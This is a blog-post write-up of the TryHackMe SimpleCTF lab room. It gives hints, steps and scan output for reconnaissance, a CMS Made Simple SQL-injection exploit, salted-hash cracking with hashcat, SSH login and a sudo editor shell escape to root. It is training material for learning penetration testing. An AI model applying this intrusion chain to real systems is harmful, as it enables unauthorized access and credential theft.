<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>THM SimpleCTF Hints, Writeup and Notes | Mr Ash Co</title>
<meta name=keywords content="TryHackMe,Capture The Flag,Walkthrough"><meta name=description content="Welcome back to TryHackMe, this time it’s SimpleCTF… or as I’d call it ‘Not So SimpleCTF’… as I had a few issues getting this CTF to work.
Let’s dive into it.
Hints How many services are running under port 1000? nmap What is running on the higher port? Check the nmap scan results. What’s the CVE you’re using against the application? CVE-****-**** don’t forget to include CVE- at the beginning. To what kind of vulnerability is the application vulnerable?"><meta name=author content="Mr Ash"><link rel=canonical href=//localhost:1313/simplectf/><meta name=google-site-verification content="G-XL842W0SQL"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.5591f0f0e6da962274ad39d968be1ca571fe1593fa5f642efac68ccea21a574f.css integrity="sha256-VZHw8ObaliJ0rTnZaL4cpXH+FZP6X2Qu+saMzqIaV08=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.acb54fd32bbc1982428b8850317e45d076b95012730a5936667e6bc21777692a.js integrity="sha256-rLVP0yu8GYJCi4hQMX5F0Ha5UBJzClk2Zn5rwhd3aSo=" onload=hljs.initHighlightingOnLoad()></script><link rel=icon href="https://p146.p4.n0.cdn.getcloudapp.com/items/Jrum0N6q/4ab8cbb7-d222-4c3c-963d-f0ec6c30568c.jpg?source=viewer&amp;v=db94595858aad20b777e4f130cbe5006"><link rel=icon type=image/png sizes=16x16 href=//localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=//localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=//localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=//localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=//localhost:1313/simplectf/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-XL842W0SQL"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-XL842W0SQL")}</script><meta property="og:title" content="THM SimpleCTF Hints, Writeup and Notes"><meta property="og:description" content="Welcome back to TryHackMe, this time it’s SimpleCTF… or as I’d call it ‘Not So SimpleCTF’… as I had a few issues getting this CTF to work.
Let’s dive into it.
Hints How many services are running under port 1000? nmap What is running on the higher port? Check the nmap scan results. What’s the CVE you’re using against the application? CVE-****-**** don’t forget to include CVE- at the beginning. To what kind of vulnerability is the application vulnerable?"><meta property="og:type" content="article"><meta property="og:url" content="//localhost:1313/simplectf/"><meta property="og:image" content="https://p146.p4.n0.cdn.getcloudapp.com/items/v1uOgk7L/6dc9e187-9662-420f-83d7-ba0b4a67686f.png?v=7de273bf70a0f5146bdf4c12478d6361"><meta property="article:section" content="post"><meta property="article:published_time" content="2022-07-03T00:00:00+00:00"><meta property="article:modified_time" content="2022-07-03T00:00:00+00:00"><meta property="og:site_name" content="Mr Ash Co"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://p146.p4.n0.cdn.getcloudapp.com/items/v1uOgk7L/6dc9e187-9662-420f-83d7-ba0b4a67686f.png?v=7de273bf70a0f5146bdf4c12478d6361"><meta name=twitter:title content="THM SimpleCTF Hints, Writeup and Notes"><meta name=twitter:description content="Welcome back to TryHackMe, this time it’s SimpleCTF… or as I’d call it ‘Not So SimpleCTF’… as I had a few issues getting this CTF to work.
Let’s dive into it.
Hints How many services are running under port 1000? nmap What is running on the higher port? Check the nmap scan results. What’s the CVE you’re using against the application? CVE-****-**** don’t forget to include CVE- at the beginning. To what kind of vulnerability is the application vulnerable?"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"//localhost:1313/post/"},{"@type":"ListItem","position":2,"name":"THM SimpleCTF Hints, Writeup and Notes","item":"//localhost:1313/simplectf/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"THM SimpleCTF Hints, Writeup and Notes","name":"THM SimpleCTF Hints, Writeup and Notes","description":"Welcome back to TryHackMe, this time it’s SimpleCTF… or as I’d call it ‘Not So SimpleCTF’… as I had a few issues getting this CTF to work.\nLet’s dive into it.\nHints How many services are running under port 1000? nmap What is running on the higher port? Check the nmap scan results. What’s the CVE you’re using against the application? CVE-****-**** don’t forget to include CVE- at the beginning. To what kind of vulnerability is the application vulnerable?","keywords":["TryHackMe","Capture The Flag","Walkthrough"],"articleBody":"Welcome back to TryHackMe, this time it’s SimpleCTF… or as I’d call it ‘Not So SimpleCTF’… as I had a few issues getting this CTF to work.\nLet’s dive into it.\nHints How many services are running under port 1000? nmap What is running on the higher port? Check the nmap scan results. What’s the CVE you’re using against the application? CVE-****-**** don’t forget to include CVE- at the beginning. To what kind of vulnerability is the application vulnerable? ***i something injection…? What’s the password? hashcat .txt Where can you log in with the details obtained? Check your nmap results again. What’s the user flag? ls and cat what you find. Is there any other user in the home directory? What’s its name? cat /home/ What can you leverage to spawn a privileged shell? Check what can be run with sudo -*. What’s the root flag? cat /root/root.txt Steps Enumeration as always, start with nmap -vv -A . With ports 21, 80, and 2222 open, we can see what we can find logging into ftp via anonymous via ftp . I didn’t find anything but checking out other writeups, it looks like my THM VM didn’t work as intended. More enumeration, since we have a website, let’s navigate to http:// and see what we can find. After manually searching, not a lot there, let’s use dirsearch -u http:// to find /simple/ directory. Navigating to http:///simple, we can find a system called ‘CMS Made Simple’ or CMSMS for short. Find the exploit using locate 'php/webapps/*****.py', then make a copy using cp /usr/share/exploitdb/exploits/php/webapps/*****.py . Getting the exploit working, now, this took a bit of time and this makes me call it ‘Not So SimpleCTF’… the correct CVE exploit is written in Python 2 with missing modules that are working in Python3. To fix this, run sudo apt install 2to3, then 2to3 *****.py, this will convert the exploit from Python 2 to Python 3. Using the exploit by running python *****.py -u http:///simple, note this took me twice to get the correct results. I tried a third time and the resulted varied, so you are warned, try a few times to make sure you get consistent results. Crack the password, use hashcat -O -a 0 -m 20 ':' .txt --show. To explain, -m 20 sets hashcat to md5 with salt:hash which is perfect from the exploit we ran. Access via ssh, run ssh mitch@10.10.44.147 -p 2222, don’t forget to specify the port number from the earlier nmap scan. Lastly, escalate privileges, now like other steps, this isn’t so simple either, but do your best to not cheat and search around. I’ll give you a hint, you can use a certain text editor as sudo which can spawn a bash shell with :!bash. Reflection This was a fun CTF from MrSeth6797 (Twitter, Website, Writeup), I would recommend this to any fellow hacking beginner. I think the basics are always important, this reinforced the importance of searching for known vulns and exploits. And also how exploits can be a bit finicky, like needing to convert the exploit from Python 2 to 3.\nI use to get a bit annoyed by rooms like this, where it wasn’t clear with things like this. But after a bit more learning, this is how technology is. Things change, the creator of that exploit wrote it in Python 2, I assume at the time Python 3 wasn’t around. So fast forward to now, our Linux systems have both Python 2 and 3, but modules might only work with 3, not 2.\nSo yeah, all these sorts of issues become less frustrating the more I learn, and it just becomes a part of the process. I’m also leaning into writeups and the THM Discord more and more. I’ve spent too long banging my head against the wall and going off track. It’s all a part of learning, but writeups can be used in a way that you don’t need to see all the answers, scrolling is a thing.\nSimpleCTF is a good, solid CTF from THM, like I said, not so Simple, but in the end, it’s worthwhile. This is day 51 of #100DaysOfHacking on my Hackers Learning Path. Subscribe for CyberSec updates or read more, happy hacking/coding/learning.\nNotes openvpn issues, in folder w/ ovpn file\nsed -i 's/cipher AES-256-CBC/data-ciphers AES-256-CBC/' *.ovpn nmap scan: nmap -vv -A Completed NSE at 17:35, 0.00s elapsed Nmap scan report for 10.10.138.218 Host is up, received syn-ack (0.29s latency). Scanned at 2022-07-02 17:34:56 EDT for 56s Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.4.33.98 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 2 | vsFTPd 3.0.3 - secure, fast, stable |_End of status | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can't get directory listing: TIMEOUT 80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu)) | http-robots.txt: 2 disallowed entries |_/ /openemr-5_0_1_3 |_http-title: Apache2 Ubuntu Default Page: It works | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) 2222/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCj5RwZ5K4QU12jUD81IxGPdEmWFigjRwFNM2pVBCiIPWiMb+R82pdw5dQPFY0JjjicSysFN3pl8ea2L8acocd/7zWke6ce50tpHaDs8OdBYLfpkh+OzAsDwVWSslgKQ7rbi/ck1FF1LIgY7UQdo5FWiTMap7vFnsT/WHL3HcG5Q+el4glnO4xfMMvbRar5WZd4N0ZmcwORyXrEKvulWTOBLcoMGui95Xy7XKCkvpS9RCpJgsuNZ/oau9cdRs0gDoDLTW4S7OI9Nl5obm433k+7YwFeoLnuZnCzegEhgq/bpMo+fXTb/4ILI5bJHJQItH2Ae26iMhJjlFsMqQw0FzLf | 256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM6Q8K/lDR5QuGRzgfrQSDPYBEBcJ+/2YolisuiGuNIF+1FPOweJy9esTtstZkG3LPhwRDggCp4BP+Gmc92I3eY= | 256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2I73yryK/Q6UFyvBBMUJEfznlIdBXfnrEqQ3lWdymK Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel NSE: Script Post-scanning. dirsearch: dirsearch -u http://\ndirsearch -u _|. _ _ _ _ _ _|_ v0.4.2 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927 Output File: /home/kali/.dirsearch/reports/10.10.138.218/_22-07-02_18-08-57.txt Error Log: /home/kali/.dirsearch/logs/errors-22-07-02_18-08-57.log Target: [18:08:58] Starting: [18:09:09] 403 - 299B - /.ht_wsr.txt [18:09:09] 403 - 302B - /.htaccess.bak1 [18:09:09] 403 - 304B - /.htaccess.sample [18:09:09] 403 - 302B - /.htaccess.orig [18:09:09] 403 - 302B - /.htaccess.save [18:09:09] 403 - 303B - /.htaccess_extra [18:09:09] 403 - 302B - /.htaccess_orig [18:09:09] 403 - 300B - /.htaccess_sc [18:09:09] 403 - 300B - /.htaccessBAK [18:09:09] 403 - 300B - /.htaccessOLD [18:09:09] 403 - 301B - /.htaccessOLD2 [18:09:09] 403 - 292B - /.htm [18:09:09] 403 - 293B - /.html [18:09:09] 403 - 302B - /.htpasswd_test [18:09:09] 403 - 298B - /.htpasswds [18:09:09] 403 - 299B - /.httr-oauth [18:09:12] 403 - 292B - /.php [18:10:12] 200 - 11KB - /index.html [18:10:34] 200 - 929B - /robots.txt [18:10:35] 403 - 301B - /server-status [18:10:35] 403 - 302B - /server-status/ **[18:10:37] 301 - 315B - /simple -\u003e Task Completed Find CVE: searchsploit ‘CMS Made Simple’\nCMS Made Simple \u003c 2.2.10 - SQL Injection | php/webapps/*****.py Find local CVE file: locate 'php/webapps/*****.py'\n/usr/share/exploitdb/exploits/php/webapps/*****.py 🔗 CVE\nUsing CVE:\nRan sudo apt install 2to3 – exploit written in python2 has missing modules. 2to3 *****.py, python *****.py -u http:///simple Note, tried multiple times and then randomly worked… didn’t change anything, ghost in shell moment. Also, took two attempts to get correct salt and hash, third attempt again produced different set. [+] Salt for password found: ***** [+] Username found: ***** [+] Email found: ***** [+] Password found: ***** Crack Password: hashcat -O -a 0 -m 20 ':' .txt --show\nNote, salt first, then hashed password, used hint for wordlist. Connect: ssh *****@ -p 2222\nPrivEsc: sudo -*\nUser mitch may run the following commands on Machine: (root) NOPASSWD: /usr/bin/******* Escalate shell: sudo ***, :!bash, cat /root/root.txt\nThanks for reading and I hope you learned something from this little exercise. This is day 52 of #100DaysOfHacking on the Hackers Learning Path. Subscribe for CyberSec updates or read more, happy hacking.\n","wordCount":"1285","inLanguage":"en","image":"https://p146.p4.n0.cdn.getcloudapp.com/items/v1uOgk7L/6dc9e187-9662-420f-83d7-ba0b4a67686f.png?v=7de273bf70a0f5146bdf4c12478d6361","datePublished":"2022-07-03T00:00:00Z","dateModified":"2022-07-03T00:00:00Z","author":{"@type":"Person","name":"Mr Ash"},"mainEntityOfPage":{"@type":"WebPage","@id":"//localhost:1313/simplectf/"},"publisher":{"@type":"Organization","name":"Mr Ash Co","logo":{"@type":"ImageObject","url":"https://p146.p4.n0.cdn.getcloudapp.com/items/Jrum0N6q/4ab8cbb7-d222-4c3c-963d-f0ec6c30568c.jpg?source=viewer\u0026v=db94595858aad20b777e4f130cbe5006"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=//localhost:1313/ accesskey=h title="mrashco (Alt + H)">mrashco</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=//localhost:1313/now title=now><span>now</span></a></li><li><a href=//localhost:1313/post title=posts><span>posts</span></a></li><li><a href=//localhost:1313/note title=notes><span>notes</span></a></li><li><a href=//localhost:1313/letter title=letters><span>letters</span></a></li><li><a href=//localhost:1313/search title=" (Alt + /)" accesskey=/><span><svg xmlns="http://www.w3.org/2000/svg" width="17.5" height="17.5" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg></span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=//localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=//localhost:1313/post/>Posts</a></div><h1 class=post-title>THM SimpleCTF Hints, Writeup and Notes</h1><div class=post-meta><span title='2022-07-03 00:00:00 +0000 UTC'>03/07/2022</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;1285 words&nbsp;·&nbsp;Mr Ash&nbsp;|&nbsp;<a href=https://github.com/mrashco/mrash.co/tree/main/content/post/2022/thm-simplectf.md rel="noopener noreferrer" target=_blank>Suggest Edits</a></div></header><figure class=entry-cover><img loading=lazy src="https://p146.p4.n0.cdn.getcloudapp.com/items/v1uOgk7L/6dc9e187-9662-420f-83d7-ba0b4a67686f.png?v=7de273bf70a0f5146bdf4c12478d6361" alt></figure><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#hints>Hints</a></li><li><a href=#steps>Steps</a></li><li><a href=#reflection>Reflection</a></li><li><a href=#notes>Notes</a></li></ul></nav></div></details></div><div class=post-content><p>Welcome back to <a href=https://tryhackme.com/>TryHackMe</a>, this time it’s <a href=https://tryhackme.com/room/easyctf>SimpleCTF</a>… or as I’d call it ‘Not So SimpleCTF’… as I had a few issues getting this CTF to work.</p><p>Let’s dive into it.</p><h2 id=hints>Hints<a hidden class=anchor aria-hidden=true href=#hints>#</a></h2><ul><li>How many services are running under port 1000? <code>nmap</code></li><li>What is running on the higher port? Check the <code>nmap</code> scan results.</li><li>What’s the CVE you’re using against the application? <code>CVE-****-****</code> don’t forget to include <code>CVE-</code> at the beginning.</li><li>To what kind of vulnerability is the application vulnerable? <code>***i</code> something injection…?</li><li>What’s the password? <code>hashcat &lt;hash> &lt;wordlist>.txt</code></li><li>Where can you log in with the details obtained? Check your <code>nmap</code> results again.</li><li>What’s the user flag? <code>ls</code> and <code>cat</code> what you find.</li><li>Is there any other user in the home directory? What’s its name? <code>cat /home/</code></li><li>What can you leverage to spawn a privileged shell? Check what can be run with <code>sudo -*</code>.</li><li>What’s the root flag? <code>cat /root/root.txt</code></li></ul><h2 id=steps>Steps<a hidden class=anchor aria-hidden=true href=#steps>#</a></h2><ol><li>Enumeration as always, start with <code>nmap -vv -A &lt;ip></code>. With ports 21, 80, and 2222 open, we can see what we can find logging into ftp via anonymous via <code>ftp &lt;ip></code>. I didn’t find anything but checking out other writeups, it looks like my THM VM didn’t work as intended.</li></ol><p><img loading=lazy src="https://p146.p4.n0.cdn.getcloudapp.com/items/v1uOL784/7113721d-e1e0-4831-9ae8-91efb0d1b77c.jpeg?v=4538363f6feb6a7e24f0c9dc88a2ee9c" alt="https://p146.p4.n0.cdn.getcloudapp.com/items/v1uOL784/7113721d-e1e0-4831-9ae8-91efb0d1b77c.jpeg?v=4538363f6feb6a7e24f0c9dc88a2ee9c"></p><ol start=2><li>More enumeration, since we have a website, let’s navigate to <code>http://&lt;ip></code> and see what we can find. After manually searching, not a lot there, let’s use <code>dirsearch -u http://&lt;ip></code> to find <code>/simple/</code> directory. Navigating to <code>http://&lt;ip>/simple</code>, we can find a system called ‘CMS Made Simple’ or CMSMS for short. Find the exploit using <code>locate 'php/webapps/*****.py'</code>, then make a copy using <code>cp /usr/share/exploitdb/exploits/php/webapps/*****.py .</code></li></ol><p><img loading=lazy src="https://p146.p4.n0.cdn.getcloudapp.com/items/RBumyjpZ/8fbe854c-6f61-4e58-9574-7bd77b8ee8eb.jpeg?v=2a6edc2faadc68365fbfd0cdfc500b11" alt="https://p146.p4.n0.cdn.getcloudapp.com/items/RBumyjpZ/8fbe854c-6f61-4e58-9574-7bd77b8ee8eb.jpeg?v=2a6edc2faadc68365fbfd0cdfc500b11"></p><p><img loading=lazy src="https://p146.p4.n0.cdn.getcloudapp.com/items/JruoGR9J/330665a7-bbf1-41c6-b102-bfdea8d214ec.jpeg?v=5d0cc838a21d5e50239766e7e0c4880f" alt="https://p146.p4.n0.cdn.getcloudapp.com/items/JruoGR9J/330665a7-bbf1-41c6-b102-bfdea8d214ec.jpeg?v=5d0cc838a21d5e50239766e7e0c4880f"></p><p><img loading=lazy src="https://p146.p4.n0.cdn.getcloudapp.com/items/6quzEl4d/6aeb90bd-4b8e-44da-8452-d2bbd49a2c36.jpeg?v=e0e0ab85aa0e87cf6188cc57314fc9e3" alt="https://p146.p4.n0.cdn.getcloudapp.com/items/6quzEl4d/6aeb90bd-4b8e-44da-8452-d2bbd49a2c36.jpeg?v=e0e0ab85aa0e87cf6188cc57314fc9e3"></p><ol start=3><li>Getting the exploit working, now, this took a bit of time and this makes me call it ‘Not So SimpleCTF’… the correct CVE exploit is written in Python 2 with missing modules that are working in Python3. To fix this, run <code>sudo apt install 2to3</code>, then <code>2to3 *****.py</code>, this will convert the exploit from Python 2 to Python 3.</li></ol><p><img loading=lazy src="https://p146.p4.n0.cdn.getcloudapp.com/items/NQulx00O/e0a7b30d-5ba9-4988-b248-1388071276d6.jpeg?v=1a05e098109581641687f3ac5598d3bc" alt="https://p146.p4.n0.cdn.getcloudapp.com/items/NQulx00O/e0a7b30d-5ba9-4988-b248-1388071276d6.jpeg?v=1a05e098109581641687f3ac5598d3bc"></p><p><img loading=lazy src="https://p146.p4.n0.cdn.getcloudapp.com/items/4gurZqq9/4459e9cc-f33c-4e45-bd71-0043678129ff.jpeg?v=c26cf4059e2adb43c82ec2f0c4fc3073" alt="https://p146.p4.n0.cdn.getcloudapp.com/items/4gurZqq9/4459e9cc-f33c-4e45-bd71-0043678129ff.jpeg?v=c26cf4059e2adb43c82ec2f0c4fc3073"></p><ol start=4><li>Using the exploit by running <code>python *****.py -u http://&lt;ip>/simple</code>, note this took me twice to get the correct results. I tried a third time and the resulted varied, so you are warned, try a few times to make sure you get consistent results.</li></ol><p><img loading=lazy src="https://p146.p4.n0.cdn.getcloudapp.com/items/JruoGRRv/47ebc687-d013-4c8b-935b-c88e4bfe4f66.jpeg?v=b72d7237c17451d2db2c0bdd83bd3d96" alt="https://p146.p4.n0.cdn.getcloudapp.com/items/JruoGRRv/47ebc687-d013-4c8b-935b-c88e4bfe4f66.jpeg?v=b72d7237c17451d2db2c0bdd83bd3d96"></p><p><img loading=lazy src="https://p146.p4.n0.cdn.getcloudapp.com/items/kpu8428g/d56f6ace-eb3e-43e5-a402-490dbc1ff3bb.jpeg?v=c6572056b97da622ef551af4c6e6eae2" alt="https://p146.p4.n0.cdn.getcloudapp.com/items/kpu8428g/d56f6ace-eb3e-43e5-a402-490dbc1ff3bb.jpeg?v=c6572056b97da622ef551af4c6e6eae2"></p><ol start=5><li>Crack the password, use <code>hashcat -O -a 0 -m 20 '&lt;salt>:&lt;hash>' &lt;wordlist>.txt --show</code>. To explain, <code>-m 20</code> sets <code>hashcat</code> to <code>md5</code> with <code>salt:hash</code> which is perfect from the exploit we ran.</li></ol><p><img loading=lazy src="https://p146.p4.n0.cdn.getcloudapp.com/items/L1uXWAAW/fa83ac46-712b-4f91-a726-fac1096fd944.jpeg?v=920a291fba73ca19b65152880a8867bf" alt="https://p146.p4.n0.cdn.getcloudapp.com/items/L1uXWAAW/fa83ac46-712b-4f91-a726-fac1096fd944.jpeg?v=920a291fba73ca19b65152880a8867bf"></p><ol start=6><li>Access via <code>ssh</code>, run <code>ssh mitch@10.10.44.147 -p 2222</code>, don’t forget to specify the port number from the earlier <code>nmap</code> scan.</li></ol><p><img loading=lazy src="https://p146.p4.n0.cdn.getcloudapp.com/items/DOudmZZr/ddd4e2be-e6c2-4283-971a-62f187630d4f.jpeg?v=0adb7d12cdaa4dab850c89953d81dc60" alt="https://p146.p4.n0.cdn.getcloudapp.com/items/DOudmZZr/ddd4e2be-e6c2-4283-971a-62f187630d4f.jpeg?v=0adb7d12cdaa4dab850c89953d81dc60"></p><ol start=7><li>Lastly, escalate privileges, now like other steps, this isn’t so simple either, but do your best to not cheat and search around. I’ll give you a hint, you can use a certain text editor as <code>sudo</code> which can spawn a bash shell with <code>:!bash</code>.</li></ol><p><img loading=lazy src="https://p146.p4.n0.cdn.getcloudapp.com/items/p9uOXJJ2/9bdd5af5-1810-4116-9ec7-10a6d2ac4788.jpeg?v=853151cc53a27778e2160ff0207ee930" alt="https://p146.p4.n0.cdn.getcloudapp.com/items/p9uOXJJ2/9bdd5af5-1810-4116-9ec7-10a6d2ac4788.jpeg?v=853151cc53a27778e2160ff0207ee930"></p><h2 id=reflection>Reflection<a hidden class=anchor aria-hidden=true href=#reflection>#</a></h2><p>This was a fun CTF from <a href=https://tryhackme.com/p/MrSeth6797>MrSeth6797</a> (<a href=https://twitter.com/0xSeth>Twitter</a>, <a href=https://floreaiulianpfa.com/>Website</a>, <a href=https://floreaiulianpfa.com/simple-ctf/>Writeup</a>), I would recommend this to any fellow hacking beginner. I think the basics are always important, this reinforced the importance of searching for known vulns and exploits. And also how exploits can be a bit finicky, like needing to convert the exploit from Python 2 to 3.</p><p>I use to get a bit annoyed by rooms like this, where it wasn’t clear with things like this. But after a bit more learning, this is how technology is. Things change, the creator of that exploit wrote it in Python 2, I assume at the time Python 3 wasn’t around. So fast forward to now, our Linux systems have both Python 2 and 3, but modules might only work with 3, not 2.</p><p>So yeah, all these sorts of issues become less frustrating the more I learn, and it just becomes a part of the process. I’m also leaning into writeups and the THM Discord more and more. I’ve spent too long banging my head against the wall and going off track. It’s all a part of learning, but writeups can be used in a way that you don’t need to see all the answers, scrolling is a thing.</p><p>SimpleCTF is a good, solid CTF from THM, like I said, not so Simple, but in the end, it’s worthwhile. This is day 51 of <a href=https://mrashleyball.com/100daysofhacking/>#100DaysOfHacking</a> on my <a href=https://mrashleyball.com/learning-path-for-beginner-hacker/>Hackers Learning Path</a>. <a href=https://go.mrash.co/newsletter>Subscribe</a> for <a href=https://mrashleyball.com/starting-out-in-cyber-security/>CyberSec</a> updates or <a href=https://mrashleyball.com/blog>read</a> more, happy hacking/coding/learning.</p><h2 id=notes>Notes<a hidden class=anchor aria-hidden=true href=#notes>#</a></h2><p>openvpn issues, in folder w/ ovpn file</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>sed</span> <span class=o>-</span><span class=n>i</span> <span class=s1>&#39;s/cipher AES-256-CBC/data-ciphers AES-256-CBC/&#39;</span> <span class=o>*.</span><span class=n>ovpn</span>
</span></span></code></pre></div><p>nmap scan: <code>nmap -vv -A &lt;ip></code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Completed NSE at 17:35, 0.00s elapsed
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.138.218
</span></span><span class=line><span class=cl>Host is up, received syn-ack <span class=o>(</span>0.29s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Scanned at 2022-07-02 17:34:56 EDT <span class=k>for</span> 56s
</span></span><span class=line><span class=cl>Not shown: <span class=m>997</span> filtered tcp ports <span class=o>(</span>no-response<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE REASON  VERSION
</span></span><span class=line><span class=cl>21/tcp   open  ftp     syn-ack vsftpd 3.0.3
</span></span><span class=line><span class=cl><span class=p>|</span> ftp-syst: 
</span></span><span class=line><span class=cl><span class=p>|</span>   STAT: 
</span></span><span class=line><span class=cl><span class=p>|</span> FTP server status:
</span></span><span class=line><span class=cl><span class=p>|</span>      Connected to ::ffff:10.4.33.98
</span></span><span class=line><span class=cl><span class=p>|</span>      Logged in as ftp
</span></span><span class=line><span class=cl><span class=p>|</span>      TYPE: ASCII
</span></span><span class=line><span class=cl><span class=p>|</span>      No session bandwidth limit
</span></span><span class=line><span class=cl><span class=p>|</span>      Session timeout in seconds is <span class=m>300</span>
</span></span><span class=line><span class=cl><span class=p>|</span>      Control connection is plain text
</span></span><span class=line><span class=cl><span class=p>|</span>      Data connections will be plain text
</span></span><span class=line><span class=cl><span class=p>|</span>      At session startup, client count was <span class=m>2</span>
</span></span><span class=line><span class=cl><span class=p>|</span>      vsFTPd 3.0.3 - secure, fast, stable
</span></span><span class=line><span class=cl><span class=p>|</span>_End of status
</span></span><span class=line><span class=cl><span class=p>|</span> ftp-anon: Anonymous FTP login allowed <span class=o>(</span>FTP code 230<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_Can<span class=err>&#39;</span>t get directory listing: TIMEOUT
</span></span><span class=line><span class=cl>80/tcp   open  http    syn-ack Apache httpd 2.4.18 <span class=o>((</span>Ubuntu<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span> http-robots.txt: <span class=m>2</span> disallowed entries 
</span></span><span class=line><span class=cl><span class=p>|</span>_/ /openemr-5_0_1_3 
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Apache2 Ubuntu Default Page: It works
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.18 <span class=o>(</span>Ubuntu<span class=o>)</span>
